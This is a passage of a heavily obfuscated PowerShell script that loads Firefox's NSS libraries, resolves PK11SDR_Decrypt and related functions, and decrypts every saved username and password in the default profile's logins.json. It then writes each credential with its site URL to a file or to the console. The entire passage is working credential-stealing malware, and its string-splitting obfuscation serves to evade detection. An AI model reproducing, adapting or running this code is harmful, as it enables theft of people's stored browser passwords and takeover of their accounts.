        Throw ((("{5}{0}{4}{2}{3}{1}{6}{7}"-f 'e to','t dlln','l','oad 32-bi',' ','Unabl','6Ps i','n 64-bit process.'))."RE`P`LACE"('n6P',[strIng][ChaR]39))
    }
    ${MozIL`La`p`ATh} = ((("{2}{4}{3}{6}{9}{8}{7}{1}{5}{0}{10}"-f 'Mozilla Fir','x86)','C:{','}','0','{0}','Progr','(',' ','am Files','efox'))-F [ChaR]92)
    
    If(&("{2}{0}{1}" -f 'st-','Path','Te') ${MOzil`L`APA`TH})
    {
        
        
        ${n`Ss3dlL} = "$mozillapath\nss3.dll"
        
        ${mo`zgLU`E`Dll} = "$mozillapath\mozglue.dll"
        ${mS`VC`R120DLL} = "$mozillapath\msvcr120.dll"
        ${mSv`CP120D`ll} = "$mozillapath\msvcp120.dll"
       
        if(&("{2}{1}{0}" -f 'Path','st-','Te') ${Ms`Vc`R1`20dLl})
        {
         
            ${ms`V`Cr120DLLhA`N`d`lE} = ${KeR`N`eL32}::("{2}{0}{1}"-f 'adLibra','ry','Lo').Invoke(${m`s`Vcr`120dLL})
            ${L`As`TerrOr}=  ( &("{2}{1}{0}"-f'rIAble','a','V')  ("N"+"I5o")  -vA  )::("{1}{4}{3}{2}{0}"-f 'or','GetL','32Err','Win','ast').Invoke()
            &("{0}{4}{3}{1}{2}" -f'Writ','s','e','-Verbo','e') ('Last'+' '+'Err'+'or '+'when'+' '+'l'+'oadin'+'g '+'moz'+'gl'+'ue.dll: '+"$LastError")
            
            
        }

        if(&("{1}{0}" -f'Path','Test-') ${M`SVc`P`120DlL})
        {
       
            ${mSvCP120Dl`lh`ANdLe} = ${kE`RN`eL32}::("{3}{0}{2}{1}"-f'L','y','ibrar','Load').Invoke(${M`s`V`Cp120Dll}) 
            ${LA`s`TErROR} =  (  &("{1}{2}{0}" -f'rIAblE','v','A')  ('n'+'i5O') -VALueo  )::("{1}{0}{3}{2}" -f 'La','Get','rror','stWin32E').Invoke()
            &("{3}{2}{1}{0}"-f 'te-Verbose','i','r','W') ('Last'+' '+'Erro'+'r '+'loa'+'ding'+' '+'m'+'scvp12'+'0.dl'+'l'+': '+"$LastError") 
            
        }

        if(&("{0}{2}{1}{3}"-f 'T','-Pa','est','th') ${MoZG`l`UED`lL})
        {
            
            ${m`ozGL`U`eDl`Lh`Andle} = ${kERn`e`l32}::("{0}{2}{1}" -f'Lo','dLibrary','a').Invoke(${mozg`l`U`edLl}) 
            ${l`As`TeRROR} =  (  &("{3}{1}{2}{0}" -f 'e','VA','RiABl','Get-') NI5o  -Value )::("{1}{3}{0}{2}" -f 'r','G','or','etLastWin32Er').Invoke()
            &("{1}{0}{3}{2}" -f 'Verb','Write-','se','o') ('La'+'st '+'e'+'rror'+' '+'loadi'+'n'+'g '+'msvcr12'+'0.d'+'ll: '+"$LastError")
            
        }
        
        
        if(&("{1}{2}{0}" -f '-Path','Te','st') ${n`s`s3dLl})
        {
            
            ${nSS`Dll`HaND`lE} = ${ke`RnEL`32}::("{3}{1}{0}{2}" -f 'r','a','y','LoadLibr').Invoke(${Nss3D`lL})
            ${LA`sTE`RRoR} =  (&("{0}{1}" -f 'vAR','IabLe') ('N'+'i5o')  -VaLU )::("{2}{3}{5}{4}{1}{0}"-f'or','r','Get','LastWin32','r','E').Invoke()
            &("{0}{1}{2}" -f'Write-V','erbo','se') ('La'+'st '+'Err'+'or'+' '+'loadin'+'g'+' '+'nss3'+'.dl'+'l: '+"$LastError")       
            
        }
    }
    

    if((${n`sSd`LLHaND`lE} -eq 0) -or (${NSsDll`H`A`NdlE} -eq  ${Ho`7`kg8}::"Z`ErO"))
    {
        &("{1}{2}{3}{0}{4}"-f 'W','W','r','ite-','arning') ("{1}{4}{3}{5}{0}{2}"-f'ss3.dl','C','l','d n','oul','ot load n')
        &("{3}{2}{0}{1}" -f'i','te-Verbose','r','W') "Last Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error()) "
        break
    }
   

    Function De`Cry`Pt`-C`iPhertExT
    {
        param
        (
            [parameter(mANDaTorY=${TR`UE})]
            [string]${CiPh`Er`T`EXt}
        )

        
        
        ${ResU`LT} = ${N`sSBASe`6`4`_d`Ec`OdebuFfeR}."i`NvokE"(  ${HO7`KG8}::"ze`Ro",  (&("{2}{0}{1}"-f'IabL','e','vAR')  ("h"+"O7kG8"))."v`ALuE"::"z`ErO", ${CI`pHeR`TE`xT}, ${CI`PH`Erte`xT}."lEN`gth")
        &("{0}{2}{1}" -f'W','erbose','rite-V') ('['+'+]NSSBase64_Deco'+'deBu'+'ffer'+' '+'Result:'+' '+"$Result")
        ${rE`SuLtp`Tr} = ${re`s`UlT} -as [IntPtr]
        ${o`FfsET} = ${R`Es`ULTptr}.("{0}{1}" -f 'T','oInt64').Invoke()
        ${NE`WP`TR} = &("{0}{1}{2}"-f 'New','-Obje','ct') ("{0}{1}{2}{3}"-f 'System.','IntP','t','r') -ArgumentList ${OF`FseT}
        ${TsECst`RUcTd`A`TA} = ${N`ewpTR} -as ${tsEC`IT`eM}
        ${p`TR} =  ${n`I5O}::("{1}{2}{0}{3}"-f'ocHGlob','A','ll','al').Invoke( (  &("{1}{0}" -f 'aBLE','varI')  Ni5O)."VA`lue"::("{0}{2}{1}"-f 'Siz','f','eO').Invoke(${t`SEc`s`TrUctDA`Ta}))
        ${EMptY`TS`e`CIt`EM} = ${P`Tr} -as ${Tse`cItem}
        ${r`Esu`LT} = ${pk`11SD`R_`dEc`RypT}."iN`Vo`KE"([ref]${tSe`csT`RuCT`daTA}, [ref]${EMPT`yT`SECIt`eM}, 0)
        &("{1}{0}{2}"-f 'bos','Write-Ver','e') ('[+]PK11S'+'D'+'R_'+'Decr'+'y'+'pt '+"result:$result")
        if(${R`eSult} -eq 0)
        {

            if(${e`MP`TYTsE`CIT`em}."sEcI`TEmL`EN" -ne 0)
            {
                ${si`ZE} = ${e`MptYTSeCIT`eM}."Seci`TE`ML`En" 
                ${d`A`TaPtr} = ${eM`p`Ty`TseCIT`EM}."sec`iTEmdA`TA" -as [IntPtr]
                ${Ret`V`AL} = &("{0}{1}{2}{3}" -f'N','ew-','Obj','ect') ("{2}{1}{0}"-f']','te[','by') ${sI`zE}
                 (&("{0}{1}" -f'V','ariAbLe')  ('n'+'I5o') )."vAl`Ue"::("{1}{0}" -f 'py','Co').Invoke(${d`ATAPtR}, ${Re`T`VAl}, 0, ${S`IZe})
                ${cLEa`RTe`XT} =   ${62`p`Kr1}::"u`Tf8"."gE`TStrI`Ng"(${r`EtVAL})
                return ${C`LeAR`TEXT}
            }

        }

    }

    ${NSsIN`I`TAd`DR} = ${keRne`l`32}::("{4}{0}{1}{3}{2}" -f 't','P','ddress','rocA','Ge').Invoke(${NSs`dLl`hAnDLe}, ("{0}{1}{2}"-f'N','SS_','Init'))
    ${n`sS`initDElegaT`ES} = &("{2}{1}{3}{4}{0}"-f'e','et','G','-Delega','teTyp') @([string]) ([long])
    ${NS`S_in`iT} =   ( &("{2}{1}{0}"-f 'LE','ARiaB','v') ('nI5'+'O') )."Val`Ue"::("{5}{6}{1}{7}{0}{8}{3}{2}{4}" -f 'o','gat','ctionPoint','n','er','Ge','tDele','eF','rFu').Invoke(${NsS`i`NIta`dDr}, ${NSSi`NIT`DeLE`GaTes})

    ${nSSBa`sE64_`Dec`odEBUff`eRa`d`dr} = ${K`ErN`EL32}::("{3}{0}{1}{2}"-f 'P','rocAdd','ress','Get').Invoke(${NS`Sdl`LhaNDlE}, ("{2}{1}{3}{0}{5}{4}"-f'64_Decode','B','NSS','ase','uffer','B'))
    ${NSSBaSe64_D`ECo`D`ebUF`FE`RDElega`T`Es} = &("{3}{0}{4}{2}{1}" -f '-D','e','gateTyp','Get','ele') @([IntPtr], [IntPtr], [string], [int]) ([int])
    ${Nss`BA`Se64_DECo`debUFfER} =   (  &("{0}{1}" -f 'iTe','m')  VarIabLE:nI5o)."vAl`Ue"::("{5}{6}{8}{3}{4}{2}{1}{0}{7}"-f 'int','ionPo','nct','o','rFu','G','etDelega','er','teF').Invoke(${nSsBAsE64_de`C`od`e`BUFF`er`A`DDR}, ${N`S`sbA`Se6`4_dECoDEBUffERdEl`EG`ATeS})

    ${Pk11Sdr`_D`ecRyp`T`A`dDR} = ${ke`RN`EL32}::("{1}{0}{3}{2}" -f 'etP','G','cAddress','ro').Invoke(${n`sSdLlha`N`DlE}, ("{3}{0}{2}{1}" -f 'SDR','crypt','_De','PK11'))
    ${Pk11SDR_dEcRyP`Tde`lEgA`T`es} = &("{0}{1}{2}{3}" -f 'Get','-','Delegate','Type') @([Type]${TsEc`ItEM}.("{2}{0}{3}{1}"-f 'keByRef','e','Ma','Typ').Invoke(),[Type]${ts`EcIteM}.("{0}{1}{2}" -f 'MakeByR','efT','ype').Invoke(), [int]) ([int])
    ${pK11`SDR_d`ecR`YPT} =   ( &("{3}{2}{1}{0}"-f'E','bl','RiA','GET-Va')  ("N"+"I5O")  -vAL )::("{5}{0}{1}{4}{6}{7}{3}{2}{8}" -f'Deleg','at','e','onPoint','eFo','Get','rFunct','i','r').Invoke(${p`K11s`DR`_decRYPTA`d`DR}, ${PK11`s`DR`_DECrYptd`E`lEGA`Tes})
    
    ${ProfIL`e`P`ATH} = "$($env:APPDATA)\Mozilla\Firefox\Profiles\*.default"
    
    ${dEfA`U`lTPR`OfIle} = $(&("{3}{0}{2}{1}"-f't','m','e','Get-ChildI') ${pR`OfiL`ePatH})."Fulln`A`mE"
    ${n`Ss`IniTRe`sU`Lt} = ${N`sS_in`IT}."I`N`Voke"(${De`FAu`LTPR`oFI`lE})
    &("{1}{2}{0}"-f'e','Write-Verbo','s') ('[+]NSS_In'+'i'+'t '+'r'+'esult'+': '+"$NSSInitResult")
    

    if(&("{1}{0}{2}" -f 'est-','T','Path') ${De`FaU`ltPrO`FiLE})
    {
        
        try
        {
           &("{0}{2}{1}"-f 'Add','Type','-') -AssemblyName ("{1}{0}{4}{3}{2}"-f'w','System.','ensions','t','eb.ex') 
        }
        catch
        {
            &("{1}{3}{0}{2}"-f'e','Wri','-Warning','t') ("{0}{8}{6}{2}{9}{4}{5}{7}{1}{3}" -f 'Unable ','bl','m.web','y','ons ','ass',' load Syste','em','to','.extensi')
            break
        }
        

        ${json`F`IlE} = &("{2}{1}{0}"-f 'ent','ont','Get-C') "$defaultProfile\logins.json"
        if(!(${Js`ON`FilE}))
        {
            &("{3}{0}{2}{1}"-f'ite-Wa','ing','rn','Wr') ("{11}{1}{3}{9}{12}{8}{4}{10}{5}{6}{7}{2}{0}"-f 'son','o','.j','g',' ','und',' in ','logins','tion cannot be','i','fo','L','n informa')
            break
        }
        ${S`Er} = &("{2}{0}{1}" -f'ew-Obj','ect','N') ("{6}{2}{8}{5}{1}{3}{4}{0}{7}" -f 'ri','ri','ystem.Web.Sc','alizatio','n.JavaSc','Se','S','ptSerializer','ript.')
        ${O`Bj} = ${s`eR}.("{3}{2}{0}{1}" -f'serializeObjec','t','e','D').Invoke(${j`SoNFiLE})

        
        ${l`OG`iNS} = ${O`BJ}[("{1}{0}"-f'gins','lo')]
        ${C`OuNt} = (${l`OGins}."C`OuNt") - 1
        ${PassWoR`d`LI`St} = @()
        
        for(${I} = 0; ${I} -le ${c`Ou`NT}; ${i}++)
        {
            &("{1}{0}{3}{2}"-f 'e','Writ','e','-Verbos') ("{4}{1}{2}{0}{7}{6}{3}{5}"-f 'pt','+]D','ecry','ion..','[','.','informat','ing login ')
            ${uS`er} = &("{2}{0}{1}{4}{3}"-f 'Cip','h','Decrypt-','ext','erT') $(${lO`G`ins}.("{2}{1}{0}"-f'e','etValu','G').Invoke(${i})[("{0}{2}{3}{4}{1}{5}"-f'en','edUser','c','ryp','t','name')])
            ${pA`SS} = &("{2}{1}{0}{3}{4}" -f 'i','rypt-C','Dec','pherTe','xt') $(${LoG`iNS}.("{0}{1}{2}"-f'G','etValu','e').Invoke(${I})[("{4}{2}{0}{3}{1}"-f 't','assword','yp','edP','encr')])
            ${f`Or`mURl} = $(${lOGi`Ns}.("{0}{1}" -f 'Get','Value').Invoke(${i})[("{0}{2}{1}{3}"-f 'f','bmit','ormSu','URL')])
            ${f`O`xcrEDS} = &("{0}{1}{2}" -f'N','ew-Ob','ject') ("{1}{2}{0}" -f'ect','P','SObj') -Property @{
                ("{2}{0}{1}" -f'Na','me','User') = ${u`SeR} 
                ("{0}{1}" -f'Passwo','rd') = ${pA`sS}
                ("{1}{0}" -f'L','UR') = ${fOR`muRl}
            }
            ${Pas`s`w`oRdList} += ${fo`Xc`REds}
        }
        
        if(${outf`ILe})
        {
            ${PASsw`o`RD`LisT} | &("{1}{0}{3}{2}" -f'ormat','F','t','-Lis') ("{0}{1}" -f 'U','RL'), ("{0}{1}"-f 'User','Name'), ("{1}{2}{0}"-f 'ord','Pa','ssw') | &("{2}{1}{0}" -f'e','ut-Fil','O') -Encoding ("{1}{0}" -f'ii','asc') ${O`U`TfILE}
        }
        else
        {
            ${PasS`WO`RDlI`sT} | &("{2}{1}{0}" -f'st','at-Li','Form') ("{1}{0}" -f 'L','UR'), ("{1}{2}{0}"-f 'me','User','Na'), ("{0}{2}{1}"-f'Pass','ord','w') | &("{1}{0}{2}" -f 'Str','Out-','ing')
        }

        ${K`eRN`el32}::("{0}{2}{1}" -f 'F','ry','reeLibra').Invoke(${MSvc`p1`20dllhAND`lE}) | &("{0}{1}"-f'Out-Nul','l')
        ${KE`R`NEL32}::("{0}{3}{2}{1}"-f'F','brary','eeLi','r').Invoke(${MSv`Cr120dl`LHAN`dLE}) | &("{0}{1}{2}"-f 'Out-','N','ull')
        ${k`E`RNE`l32}::("{3}{0}{1}{2}" -f'eeLib','ra','ry','Fr').Invoke(${MO`z`g`LUedLlh`A`NDLE}) | &("{0}{1}{2}" -f'Out-N','u','ll')
        ${ker`Nel`32}::("{1}{2}{0}{3}"-f 'r','FreeLib','ra','y').Invoke(${N`ssDL`lHAnDle}) | &("{2}{1}{0}"-f 'l','Nul','Out-')
      
    }
    else
    {
        &("{2}{1}{3}{0}{4}" -f'War','ite','Wr','-','ning') ("{5}{3}{1}{2}{4}{0}"-f 'ile','locate defa','ult ','to ','prof','Unable ')
    }
    

}